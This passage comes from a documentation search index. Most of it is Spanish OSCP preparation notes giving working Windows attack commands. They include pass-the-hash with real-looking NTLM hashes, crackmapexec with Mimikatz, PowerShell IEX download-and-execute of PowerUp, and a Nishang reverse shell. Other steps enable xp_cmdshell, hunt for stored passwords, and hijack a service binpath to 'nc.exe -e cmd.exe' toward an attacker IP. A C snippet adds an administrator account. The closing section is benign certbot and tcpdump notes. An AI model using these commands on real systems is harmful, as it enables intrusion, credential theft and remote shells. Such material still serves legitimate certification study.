encontrar\u00e1. Si queremos que funcione de manera temporal para la ejecuci\u00f3n del ebowla, simplemente hacemos un EXPORT de nuestro PATH:</p> <pre><code>export PATH=/usr/local/go/bin:$PATH\n</code></pre> <p>Obviamente, cuantas m\u00e1s variables de entorno utilicemos mejor ser\u00e1 nuestro AV Evasion.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#windows-port-forwarding","title":"Windows Port Forwarding","text":"<p>Para ponernos en escena, supongamos que hemos comprometido un equipo Windows como usuario con bajos privilegios. Enumerando las claves de registro, encontramos una contrase\u00f1a que aparentemente parece ser del usuario Administrador. Decidimos no comernos la cabeza con el RunAs y queremos usar psexec para conseguir acceso como dicho usuario a nivel de sistema entablando la conexi\u00f3n desde nuestro equipo, pero... problema, el equipo no tiene el servicio samba expuesto hacia afuera.</p> <p>Llegados a este punto, si ya tenemos acceso al sistema... basta con transferir el binario plink.exe para llevar a cabo el procedimiento.</p> <p>Lo \u00fanico que tenemos que hacer, es iniciar el servicio SSH en nuestro equipo. Es importante que sobre el fichero sshd_config del ssh, el usuario root se pueda loguear, pues para que todo esto funcione es necesario que sea root el que se conecte, pues en caso contrario no va a funcionar.</p> <p>Cuando todo est\u00e9 configurado correctamente, desde la m\u00e1quina Windows ya con el binario transferido, aplicamos el siguiente comando hacia nuestra m\u00e1quina local:</p> <pre><code>plink.exe -l root -pw tuPassword -R 445:127.0.0.1:445 tuDirecci\u00f3nIP\n</code></pre> <p>Autom\u00e1ticamente, se entablar\u00e1 la conexi\u00f3n hacia nuestro equipo y haciendo un <code>lsof -i:445</code>, podremos verificar como se ha levantado el servicio en nuestra m\u00e1quina.</p> <p>Ahora la idea es llevar a cabo la autenticaci\u00f3n desde nuestra m\u00e1quina al propio servicio local, el cual enruta al servicio samba de la m\u00e1quina Windows. Suponiendo que la contrase\u00f1a del usuario administrador es 'test123', aplicamos el siguiente comando en local:</p> <pre><code>/usr/share/doc/python-impacket/examples/psexec.py WORKGROUP/Administrator:test123@127.0.0.1 cmd.exe\n</code></pre> <p>Una vez aplicado el comando, veremos c\u00f3mo accedemos al equipo remoto (siempre y cuando las credenciales proporcionadas sean las correctas y se tengan los permisos suficientes sobre los recursos compartidos por el servicio).</p> <p>Una forma de comprobar que el servicio Samba de nuestro equipo local corresponde al servicio Samba de la m\u00e1quina remota, es jugando con cme, donde podremos ver el HOSTNAME a modo de check.</p> <p>Simplemente creamos un fichero ip con nuestra IP local (127.0.0.1) y aplicamos posteriormente desde terminal el siguiente comando sobre dicho fichero:</p> <pre><code>cme smb ip --gen-relay-list ip\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#hashdump-manual","title":"Hashdump Manual","text":"<p>Desde Metasploit, uno est\u00e1 acostumbrado a utilizar el hashdump para dumpear los hashes NTLM del sistema, as\u00ed como el auxiliar. A continuaci\u00f3n se detalla el procedimiento manual para el volcado de hashes NTLM, haciendo uso para ello de la herramienta pwdump.</p> <p>Es tan sencillo como traerse con privilegios de administrador, los recursos SAM y System del equipo. Una vez transferidos, aplicamos el siguiente comando desde terminal en nuestro equipo:</p> <pre><code>pwdump system SAM\n</code></pre> <p>Directamente, veremos los Hashes NTLM de los usuarios, los cuales posteriormente en caso de figurar el servicio samba abierto podemos aprovechar para hacer PassTheHash.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#passthehash","title":"PassTheHash","text":"<p>A la hora de contar con un Hash NTLM v\u00e1lido de usuario, por ejemplo para este caso pr\u00e1ctico, de Administrador, podemos llevar a cabo una autenticaci\u00f3n contra el sistema a fin de conseguir una Shell interactiva a trav\u00e9s del servicio Samba.</p> <p>Para ello, podemos utilizar herramientas como pth-winexe, la cual nos permite hacer conexiones como la siguiente:</p> <pre><code>pth-winexe -U WORKGROUP/Administrator%aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 //192.168.1.5 cmd.exe\n</code></pre> <p>Como es de obviar, este paso nos ahorra el tener que crackear la contrase\u00f1a. El hecho de poseer el Hash NTLM de un usuario, nos permite entre otras cosas ser aprovechado para elaborar un sprying de credenciales a nivel de red local:</p> <pre><code>crackmapexec smb 192.168.1.0/24 -u 'Administrator' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 \n</code></pre> <p>Obteniendo un pwned en caso de lograr la autenticaci\u00f3n para algunos de los Hosts probados. A su vez, su uso puede ser \u00fatil para inyectar Mimikatz desde el propio crackmapexec, de la siguiente forma:</p> <pre><code>crackmapexec smb 192.168.1.45 -u 'Administrator ' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 -M mimikatz\n</code></pre> <p>Tambi\u00e9n habr\u00eda servido contra todo el rango /24. Su uso tambi\u00e9n puede ser utilizado incluso para en caso de no conocer la contrase\u00f1a en claro, realizar autenticaciones v\u00eda RDP:</p> <pre><code>xfreerdp /u:Administrator /d:WORKGROUP /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:192.168.1.5\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#enumeration-and-privilege-escalation","title":"Enumeration and Privilege Escalation","text":"<p>Aunque se le puede dar mil vueltas a este apartado, como tampoco pretendo hacerlo extenso cito 2 recursos fundamentales de numeraci\u00f3n que pueden servir bastante de ayuda a la hora de buscar formas de escalar privilegios.</p> <p>Uno de ellos es el recurso PowerUp.ps1 de PowerSploit, recurso que considero esencial para tener una visual r\u00e1pida del sistema (en ocasiones podemos encontrar ficheros interesantes e incluso contrase\u00f1as en texto claro). Generalmente, lo hay quienes transfieren el archivo sobre el sistema, importan el m\u00f3dulo y luego lo ejecutan... yo lo suelo hacer todo de una.</p> <p>Para ello, podemos comprobar como una de las funciones principales que contiene el script es la siguiente:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/opt/PowerSploit/Privesc]\n\u2514\u2500\u2500\u257c #cat PowerUp.ps1 | grep AllChecks  | grep \"function\" | tr -d '{'\nfunction Invoke-AllChecks \n</code></pre> <p>Para poder ejecutarla de un solo tir\u00f3n, a\u00f1adimos una llamada a dicha funci\u00f3n al final de nuestro script:</p> <pre><code># \u00daltimas l\u00edneas del script\n\n$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'\n$Advapi32 = $Types['advapi32']\n$Kernel32 = $Types['kernel32']\n\nInvoke-AllChecks\n</code></pre> <p>Por tanto, una vez con esto preparado, compartimos un servidor con Python en nuestro equipo sobre el directorio en el que se encuentra el recurso, posteriormente, desde Windows, aplicamos el siguiente comando:</p> <pre><code>powershell IEX(New-Object Net.WebClient).downloadString('http://ipLocal:8080/PowerUp.ps1')\n</code></pre> <p>Esperamos unos segundos, y obtendremos directamente los resultados de la ejecuci\u00f3n del script.</p> <p>En cuanto a exploits a usar a nivel de sistema para escalar privilegios, una buena idea es usar el script Sherlock.ps1 para la enumeraci\u00f3n, donde se nos listar\u00e1n en base al an\u00e1lisis efectuado un pu\u00f1ado de exploits a usar con sus respectivos enlaces. La idea es seguir el mismo concepto que el que hicimos con PowerUp.ps1, s\u00f3lo que en este caso, la funci\u00f3n a a\u00f1adir en la \u00faltima l\u00ednea ser\u00eda Find-AllVulns.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#powershell-reverse-shell","title":"PowerShell Reverse Shell","text":"<p>Para los amantes de PowerShell que no viven sin su sesi\u00f3n PS, por aqu\u00ed os explico una t\u00e9cnica para conseguir acceso al sistema con sesi\u00f3n PowerShell. Lo primero que debemos hacer, es descargar Nishang, una vez instalado, utilizaremos para este caso el recurso situado en Shells/Invoke-PowerShellTcp.ps1.</p> <p>A\u00f1adimos al final del script la siguiente l\u00ednea:</p> <p><code>Invoke-PowerShellTcp -Reverse -IPAddress tuIP -Port 443</code></p> <p>Una vez hecho, nos montamos un servidor con Python para compartir dicho recurso y por otro lado nos ponemos en escucha por Netcat en el puerto 443. Una vez con el arsenal preparado, aplicamos el siguiente comando desde terminal en Windows:</p> <pre><code>powershell IEX(New-Object Net.WebClient).downloadString('http://tuIP:8080/Invoke-PowerShellTcp.ps1')\n</code></pre> <p>En cuesti\u00f3n de unos segundos, veremos como se recibe un GET del lado de nuestro servidor e inmediatamente ganamos acceso al sistema v\u00eda PowerShell.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#manual-migration-process","title":"Manual Migration Process","text":"<p>Aunque las m\u00e1quinas Windows del examen suelen ser de 32 bits, como m\u00e1s vale prevenir que curar detallo una t\u00e9cnica para migrar de un proceso de 32 bits a uno de 64 bits. Cabe decir que este procedimiento es importante de cara a la correcta enumeraci\u00f3n del sistema, pues en caso de figurar en un proceso que no corra bajo la arquitectura de la m\u00e1quina, tanto Sherlock, como PowerUp.ps1 como incluso el propio suggester de Metasploit, dar\u00e1n mont\u00f3n de falsos positivos.</p> <p>El saber con qu\u00e9 aquitectura estamos tratando tanto del sistema operativo como a nivel de proceso, podemos hacerlo via Powershell, obteniendo True o False dependiendo de si es cierto o no a trav\u00e9s de las siguientes consultas:</p> <p><code>[Environment]::Is64BitOperatingSystem</code></p> <p><code>[Environment]::Is64BitProcess</code></p> <p>Si vemos que se trata de un sistema operativo de 64 bits, y la sentencia <code>[Environment]::Is64BitProcess</code> nos devuelve un False, lo \u00fanico que tendremos que hacer es por ejemplo ganando sesi\u00f3n por Powershell invocar al mismo desde la siguiente ruta:</p> <pre><code>C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\Powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.45:443/Invoke-PowerShellTcp.ps1')\n</code></pre> <p>Compartiendo el recurso citado de nishang. Si volvemos a checkear en qu\u00e9 proceso nos situamos, podremos ver que esta vez la consulta <code>[Environment]::Is64BitProcess</code> nos devolver\u00e1 un True, pudiendo ya proseguir con la enumeraci\u00f3n a nivel de sistema.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#rce-filter-evasion-microsoft-sql","title":"RCE Filter Evasion Microsoft SQL","text":"<p>El servicio ms-sql-s dentro de nuestro Low Hanging Fruit es un buen servicio a enumerar, sobre todo para saber si cuenta con credenciales por defecto. En caso de contar con credenciales por defecto, nos podemos conectar v\u00eda sqsh o a trav\u00e9s del script mssqlclient.py, pudiendo posteriormente probar si somos capaces de utilizar la funcionalidad xp_cmdshell, la cual nos permite ejecutar comandos sobre el sistema.</p> <p>En caso de contar con credenciales v\u00e1lidas, podemos realizar la autenticaci\u00f3n al servicio via sqsh de la siguiente forma:</p> <pre><code>sqsh -S 192.168.1.X -U sa -P superPassword\n</code></pre> <p>En caso de querer probar credenciales por defecto, como el usuario es sa y no posee password, simplemente omitimos el par\u00e1metro -P.</p> <p>Una vez conectados, podemos realizar las siguientes instrucciones:</p> <pre><code>1&gt; xp_cmdshell 'whoami'\n2&gt;go\n\nnt authority\\ system\n</code></pre> <p>Puede ser que se de el caso donde tras lanzar la instrucci\u00f3n go, se nos presente un mensaje que nos avisa de que el componente est\u00e1 deshabilitado. Para habilitarlo, simplemente seguimos las siguientes instrucciones:</p> <pre><code>1&gt; EXEC SP_CONFIGURE 'show advanced options', 1\n2&gt; reconfigure\n3&gt; go\n4&gt; EXEC SP_CONFIGURE 'xp_cmdhshell', 1\n5&gt; reconfigure\n6&gt; go\n7&gt; xp_cmdshell \"whoami\"\n8&gt; go\n\nnt authority\\ system\n</code></pre> <p>Y ya lograremos ejecutar comandos sobre el sistema.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#mssqlclient-impacket","title":"mssqlclient Impacket","text":"<p>El recurso lo podemos obtener aqu\u00ed, y su uso es similar al de psexec. En mi caso, lo uso cuando han cambiado el puerto por defecto:</p> <pre><code>python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758\n</code></pre> <p>Posteriormente, las consultas se hacen igual a las descritas en el anterior punto.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#reconocimiento-del-sistema","title":"Reconocimiento del Sistema","text":"<p>Sobre el sistema Windows comprometido, a fin de escalar privilegios podemos llevar a cabo la siguiente enumeraci\u00f3n manual, redireccionando todo a un fichero de reportes:</p> <pre><code> @echo --------- BASIC WINDOWS RECON ---------  &gt; report.txt\n timeout 1\n net config Workstation  &gt;&gt; report.txt\n timeout 1\n systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" &gt;&gt; report.txt\n timeout 1\n hostname &gt;&gt; report.txt\n timeout 1\n net users &gt;&gt; report.txt\n timeout 1\n ipconfig /all &gt;&gt; report.txt\n timeout 1\n route print &gt;&gt; report.txt\n timeout 1\n arp -A &gt;&gt; report.txt\n timeout 1\n netstat -ano &gt;&gt; report.txt\n timeout 1\n netsh firewall show state &gt;&gt; report.txt\n timeout 1\n netsh firewall show config &gt;&gt; report.txt\n timeout 1\n schtasks /query /fo LIST /v &gt;&gt; report.txt\n timeout 1\n tasklist /SVC &gt;&gt; report.txt\n timeout 1\n net start &gt;&gt; report.txt\n timeout 1\n DRIVERQUERY &gt;&gt; report.txt\n timeout 1\n reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated &gt;&gt; report.txt\n timeout 1\n reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated &gt;&gt; report.txt\n timeout 1\n dir /s *pass* == *cred* == *vnc* == *.config* &gt;&gt; report.txt\n timeout 1\n findstr /si password *.xml *.ini *.txt &gt;&gt; report.txt\n timeout 1\n reg query HKLM /f password /t REG_SZ /s &gt;&gt; report.txt\n timeout 1\n reg query HKCU /f password /t REG_SZ /s &gt;&gt; report.txt\n timeout 1\n dir \"C:\\\"\n timeout 1\n dir \"C:\\Program Files\\\" &gt;&gt; report.txt\n timeout 1\n dir \"C:\\Program Files (x86)\\\"\n timeout 1\n dir \"C:\\Users\\\"\n timeout 1\n dir \"C:\\Users\\Public\\\"\n timeout 1\n echo REPORT COMPLETE!\n</code></pre> <p>A su vez, podemos hacer del recurso wmic-info a fin de obtener informaci\u00f3n acerca del sistema.</p> <p>Otra opci\u00f3n, es utilizar icacls.bat, para la enumeraci\u00f3n de permisos d\u00e9biles a nivel de sistema.</p> <p>Una buena herramienta a utilizar para la enumeraci\u00f3n de permisos d\u00e9biles asignados sobre archivos que son ejecutados a trav\u00e9s de tareas en intervalos regulares de tiempo es schcheck.bat</p> <p>A continuaci\u00f3n, se detallan algunos usos de accesschk.exe, ideal para identificar el nivel de acceso que un usuario o grupo particular tiene a archivos, directories o claves de registro.</p> <pre><code>accesschk \"power users\" c:\\windows\\system32\naccesschk users -cw *\naccesschk.exe -uwcqv \"Authenticated Users\" *\naccesschk.exe -uwcqv adam.dale *\naccesschk.exe -ucqv NetLogon\naccesschk.exe -uwdqs Users c:\\\naccesschk.exe -uwdqs \"Authenticated Users\" c:\naccesschk.exe -uwqs Users c:\\*.*\naccesschk.exe -uwqs \"Authenticated Users\" c:\\*.*\naccesschk -kns austin\\mruss hklm\\software\naccesschk -k hklm\\software\naccesschk -e -s c:\\users\\mark\naccesschk -wuo everyone \\basednamedobjects\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#kernel-exploits-windows","title":"Kernel Exploits Windows","text":"<p>A continuaci\u00f3n, se enumeran distintos exploits de Kernel interesantes a usar que en m\u00e1s de una ocasi\u00f3n han funcionado en las m\u00e1quinas del lab. As\u00ed mismo es recomendable llevarlos siempre bajo la manga:</p> <ul> <li>MS14-070</li> <li>MS09-012</li> <li>MS11-046</li> </ul>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#privilege-escalation-enumerations","title":"Privilege Escalation Enumerations","text":"<p>A continuaci\u00f3n, se detalla una enumeraci\u00f3n b\u00e1sica del sistema.</p> <p>Informaci\u00f3n B\u00e1sica</p> <pre><code>systeminfo\nhostname\n</code></pre> <p>\u00bfQui\u00e9nes somos?</p> <pre><code>whoami\necho %username%\n</code></pre> <p>\u00bfQu\u00e9 usuarios y grupos locales existen en el sistema?</p> <pre><code>net users\nnet localgroups\n</code></pre> <p>Enumerar informaci\u00f3n de usuario, interesante para ver si el usuario posee privilegios</p> <pre><code>net user usuario\n</code></pre> <p>Ver grupos de Dominio</p> <pre><code>net group /domain\n</code></pre> <p>Ver miembros del Domain Group</p> <pre><code>net group /domain &lt;Group Name&gt;\n</code></pre> <p>Firewall</p> <pre><code>netsh firewall show state\nnetsh firewall show config\n</code></pre> <p>Network</p> <pre><code>ipconfig /all\nroute print\narp -A\n</code></pre> <p>\u00bfC\u00f3mo de bien est\u00e1 parcheado el sistema?</p> <pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn\n</code></pre> <p>B\u00fasqueda de Contrase\u00f1as en Texto Claro sobre el Sistema</p> <pre><code>findstr /si password *.txt\nfindstr /si password *.xml\nfindstr /si password *.ini\n\ndir /s *pass* == *cred* == *vnc* == *.config*\n\nfindstr /spin \"password\" *.*\nfindstr /spin \"password\" *.*\n</code></pre> <p>B\u00fasqueda de Contrase\u00f1as en Texto Claro sobre Archivos</p> <p>Es probable que nos las encontremos en Base64:</p> <pre><code>c:\\sysprep.inf\nc:\\sysprep\\sysprep.xml\nc:\\unattend.xml\n%WINDIR%\\Panther\\Unattend\\Unattended.xml\n%WINDIR%\\Panther\\Unattended.xml\n\ndir c:\\*vnc.ini /s /b\ndir c:\\*ultravnc.ini /s /b \ndir c:\\ /s /b | findstr /si *vnc.ini\n</code></pre> <p>B\u00fasqueda de Contrase\u00f1as en Texto Claro Almacenadas en Registro</p> <pre><code># VNC\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\n\n# Windows autologin\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\n\n# SNMP Paramters\nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"\n\n# Putty\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\n\n# B\u00fasqueda de Contrase\u00f1as almacenadas en Registro\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n</code></pre> <p>Scheduled Tasks</p> <pre><code>schtasks /query /fo LIST /v &gt; schtasks.txt\ncat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM\n</code></pre> <p>Cambio de binario para el servicio upnp</p> <pre><code>sc config upnphost binpath= \"C:\\Inetpub\\nc.exe 192.168.1.X 6666 -e c:\\Windows\\system32\\cmd.exe\"\nsc config upnphost obj= \".\\LocalSystem\" password= \"\"\nsc config upnphost depend= \"\"\n</code></pre> <p>B\u00fasqueda de Permisos D\u00e9biles</p> <pre><code>wmic service list brief\n\n# El comando anterior generar\u00e1 mont\u00f3n de contenido, por lo tanto, una buena pr\u00e1ctica es parsear los resultados. Lo hacemos en los siguiente pasos.\n\nfor /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a &gt;&gt; c:\\windows\\temp\\permissions.txt\n\nfor /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\"\n\nsc query state= all | findstr \"SERVICE_NAME:\" &gt;&gt; Servicenames.txt\n\nFOR /F %i in (Servicenames.txt) DO echo %i\ntype Servicenames.txt\n\nFOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt\n\nFOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" &gt;&gt; path.txt\n\n# Procesamos a continuaci\u00f3n cada uno de los resultados obtenidos v\u00eda cacls\n\ncacls \"C:\\path\\to\\file.exe\"\n</code></pre> <p>En este paso siempre vamos a estar interesados en el Output BUILTIN\\Users:(F), o que nuestro usuario cuente con los permisos (F) o (C):</p> <pre><code>C:\\path\\to\\file.exe \nBUILTIN\\Users:F\nBUILTIN\\Power Users:C \nBUILTIN\\Administrators:F \nNT AUTHORITY\\SYSTEM:F\n</code></pre> <p>Esto quer\u00e1 decir que nuestro usuario posee permisos de escritura sobre dichos recursos, permiti\u00e9ndonos de esta forma incrustrar un ejecutable malicioso. </p> <p>A continuaci\u00f3n, se representa un ejemplo de c\u00f3digo en C para un simple getsuid:</p> <pre><code>#include &lt;stdlib.h&gt;\nint main ()\n{\nint i;\n    i = system(\"net localgroup administrators theusername /add\");\nreturn 0;\n}\n</code></pre> <p>Compilamos el mismo haciendo uso de la siguiente sint\u00e1xis:</p> <pre><code>i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe\n</code></pre> <p>Una vez compilado y depositado sobre el sistema donde tenemos permisos de sobreescritura (sustituyendo el binario asignado al servicio), reiniciamos el servicio v\u00eda wmic o net, de la siguiente forma:</p> <pre><code>wmic service NAMEOFSERVICE call startservice\n\nnet stop [service name] &amp;&amp; net start [service name].\n</code></pre> <p>Unquoted Service Paths</p> <p>Esta t\u00e9cnica es fundamental para la escalada de privilegios. En primer lugar buscamos servicios con Unquoted path:</p> <pre><code># Usando WMIC\nwmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\"\n\n# Usando sc\nsc query\nsc qc service name\n</code></pre> <p>Si la ruta de alguno de los servicios listados contienen un espacio y no est\u00e1n doblemente encomillados, el servicio es vulnerable.</p> <p>Suponiendo que la ruta fuera esta a modo de ejemplo:</p> <pre><code>c:\\Program Files\\something\\winamp.exe\n</code></pre> <p>Podr\u00edamos depositar un binario tal que as\u00ed:</p> <pre><code>c:\\program.exe\n</code></pre> <p>Tras reiniciar el servicio, lo que suceder\u00e1 es que tomar\u00e1 como binario a ejecutar el situado en c:\\program.exe en vez del que deber\u00eda, permitiendo as\u00ed llevar a cabo una ejecuci\u00f3n con posibilidad de alto privilegio sobre el mismo.</p> <p>M\u00f3dulos interesantes de Post-Explotaci\u00f3n desde Metasploit</p> <pre><code>use exploit/windows/local/service_permissions\n\npost/windows/gather/credentials/gpp\n\nrun post/windows/gather/credential_collector \n\nrun post/multi/recon/local_exploit_suggester\n\nrun post/windows/gather/enum_shares\n\nrun post/windows/gather/enum_snmp\n\nrun post/windows/gather/enum_applications\n\nrun post/windows/gather/enum_logged_on_users\n\nrun post/windows/gather/checkvm\n</code></pre>"},{"location":"SSL/SSLInstallCert/","title":"SSLInstallCert","text":""},{"location":"SSL/SSLInstallCert/#ssl-install-cert","title":"SSL Install Cert","text":""},{"location":"SSL/SSLInstallCert/#install","title":"Install","text":"<pre><code>## Try 1\nsudo snap install\n## Try 2\nsudo apt install snap\n## Cert INstall\nsudo snap install --classic certbot\n## Cert register\nsudo certbot certonly\n</code></pre>"},{"location":"SSL/SSLInstallCert/#monitoring-calls","title":"Monitoring Calls","text":"<pre><code>## Monit incoming \n# tcpdump filter for HTTP GET  \nsudo tcpdump -s 0 -A 'tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420'\n\n# tcpdump filter for HTTP POST  \nsudo tcpdump -s 0 -A 'tcp dst port 80 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)'\n\n# tcpdump filter for POST PORT \ntcpdump -s 0 -A 'tcp dst port 3000 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)' \n\n# tcpdump filter for GET PORT \ntcpdump -s 0 -A 'tcp dst port 3003 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420)'\n</code></pre>"},{"location":"SSL/SSLInstallCert/#kill-nginx-ports","title":"Kill Nginx Ports","text":"<pre><code>kill -9 $(sudo lsof -i -P -n | grep nginx)\nsudo killall nginx\nsudo certbot renew --dry-run\n</code></pre>"},{"location":"SSL/SSLInstallCert/#intall-tcpdump-and-lsof","title":"Intall tcpdump and lsof","text":"<pre><code>apt-get install tcpdump\napt-get install lsof\n</code></pre>"},{"location":"SSL/SSLInstallCert/#trubleshoot","title":"Trubleshoot","text":"<pre><code>sudo killall nginx\nsudo certbot -v -i nginx -d sub.example.com -d sub2.example.com certonly\nsudo nginx -t\nsudo nginx -s reload\n</code></pre>"},{"location":"SSL/manualCerts/","title":"Generating The Wildcard SSL Certificate using certbot cli","text":"<p>At this stage you should have your certbot cli installed.</p> <pre><code>certbot certonly --manual \\\n  --preferred-challenges=dns \\\n  --email marcin@hotmail.com \\\n  --server https://acme-v02.api.letsencrypt.org/directory \\\n  --agree-tos \\\n  --manual-public-ip-logging-ok \\\n  -d \u201c*.domain.com\u201d\n</code></pre> <p>expected output:</p> <pre><code>Saving debug log to /var/log/letsencrypt/letsencrypt.log\nPlugins selected: Authenticator manual, Installer None\nObtaining a new certificate\nPerforming the following challenges:\ndns-01 challenge for domain.com- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nPlease deploy a DNS TXT record under the name\n_acme-challenge.domain.com with the following value:SiPbTUGdqp37WnMNnG17N4qoZEVIiuO_MivrrhYmW-YBefore continuing, verify the record is deployed.\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nPress Enter to Continue\nWaiting for verification...\nCleaning up challengesIMPORTANT NOTES:\n - Congratulations! Your certificate and chain have been saved at:\n   /etc/letsencrypt/live/domain.com/fullchain.pem\n   Your key file has been saved at:\n   /etc/letsencrypt/live/domain.com/privkey.pem\n   Your cert will expire on 2020-09-06. To obtain a new or tweaked\n   version of this certificate in the future, simply run certbot\n   again. To non-interactively renew *all* of your certificates, run\n   \"certbot renew\"\n</code></pre> <p>During the execution you will be prompt to create TXT record inside Route53 which you can see demonstrated below:</p> <p></p> <p></p> <p>Once you have that record in place, press enter to continue and you will get a desired output presented above.</p>"},{"location":"SSL/manualCerts/#find-the-ssl-certificate","title":"Find the SSL Certificate","text":"<p>After your certificate is successfully generated. You can find them in the default location:</p> <pre><code>/etc/letsencrypt/live\n</code></pre> <p>So certificates for domain.com will be available in <code>/etc/letsencrypt/live/domain.com/</code></p>"},{"location":"SSL/manualCerts/#more-above-folder-structure-and-naming","title":"More above folder structure and naming","text":"<p>All generated keys and issued certificates can be found in <code>/etc/letsencrypt/live/${domain}</code>. In the case of creating a SAN certificate with multiple alternative names, <code>${domain}</code> is the first domain passed in via -d parameter. Rather than copying, please point your (web) server configuration directly to those files (or create symlinks). During the **renew**al, <code>/etc/letsencrypt/live</code> is updated with the latest necessary files.</p> <p>For historical reasons, the containing directories are created with permissions of <code>0700</code> meaning that certificates are accessible only to servers that run as the root user. If you will never downgrade to an older version of Certbot, then you can safely fix this using <code>chmod 0755 /etc/letsencrypt/{live,archive}</code>.</p> <p>For servers that drop root privileges before attempting to read the private key file, you will also need to use <code>chgrp</code> and <code>chmod 0640</code> to allow the server to read <code>/etc/letsencrypt/live/$domain/privkey.pem</code>.</p>"},{"location":"SSL/manualCerts/#available-files-for-each-certificate","title":"Available files for each certificate","text":"<p>Inside that folder you will find following files:</p> <p><code>privkey.pem</code> \u2014 private key for the certificate.</p> <p><code>fullchain.pem</code> \u2014 All certificates, including server certificate (aka leaf certificate or end-entity certificate). The server certificate is the first one in this file, followed by any intermediates.</p> <p><code>cert.pem and chain.pem</code> \u2014 <code>cert.pem</code> contains the server certificate by itself, and <code>chain.pem</code> contains the additional intermediate certificate or certificates that web browsers will need in order to validate the server certificate. If you provide one of these files to your web server, you must provide both of them, or some browsers will show \u201cThis Connection is Untrusted\u201d errors for your site, some of the time.</p>"},{"location":"SSL/manualCerts/#verify-validity-of-ssl-certificates-generated-by-certbot","title":"Verify validity of SSL Certificates generated by Certbot","text":"<p>To do that you can run the following command:</p> <pre><code>sudo certbot certificates\n</code></pre> <p>which will generate following output:</p> <pre><code>Found the following certs:\n  Certificate Name: domain.com\n    Serial Number: 4c006834c40af115ed6336331bc93034c97\n    Domains: *.domain.com\n    Expiry Date: 2020-09-06 07:51:47+00:00 (VALID: 89 days)\n    Certificate Path: /etc/letsencrypt/live/domain.com/fullchain.pem\n    Private Key Path: /etc/letsencrypt/live/domain.com/privkey.pem\n  Certificate Name: domain.io\n    Serial Number: 318d565040c512614e31c77e938f024d256\n    Domains: *.domain.io\n    Expiry Date: 2020-09-06 06:28:59+00:00 (VALID: 89 days)\n    Certificate Path: /etc/letsencrypt/live/domain.io/fullchain.pem\n    Private Key Path: /etc/letsencrypt/live/domain.io/privkey.pem\n  Certificate Name: domain.net\n    Serial Number: 31a5f3ecf68387f2a023758f2a7cac58b93\n    Domains: *.domain.net\n    Expiry Date: 2020-09-06 07:47:34+00:00 (VALID: 89 days)\n    Certificate Path: /etc/letsencrypt/live/domain.net/fullchain.pem\n    Private Key Path: /etc/letsencrypt/live/domain.net/privkey.pem\n</code></pre> <p>Note that in my output above, I have three wildcard SSL certificates for three different domains.</p>"},{"location":"SSL/manualCerts/#uploading-certs-to-aws-acm","title":"Uploading certs to AWS ACM","text":"<p>Assuming you have all the files available for your generated SSL certificate, you can make use of AWS CLI to import your certificate to ACM.</p> <pre><code>aws --region eu-west-1 acm import-certificate \\\n--certificate \"/etc/letsencrypt/live/domain.com/cert.pem\" \\\n--private-key \"/etc/letsencrypt/live/domain.com/privkey.pem\" \\\n--certificate-chain \"/etc/letsencrypt/live/domain.com/fullchain.pem\"\n</code></pre>"},{"location":"SSL/manualCerts/#conclusion","title":"Conclusion","text":"<p>I have demonstrated how to generate and upload SSL certificates to AWS ACM. Personally, I find Certbot very easy to use. I have not hit any issues so far.</p> <p>Important note, each Certificate is valid for 90 days so it is recommended to renew them every 60 day as per docs.</p> <p>Hope this is going to help others and speed up their learning.</p>"},{"location":"SSL/ssl-openssl/","title":"Ssl 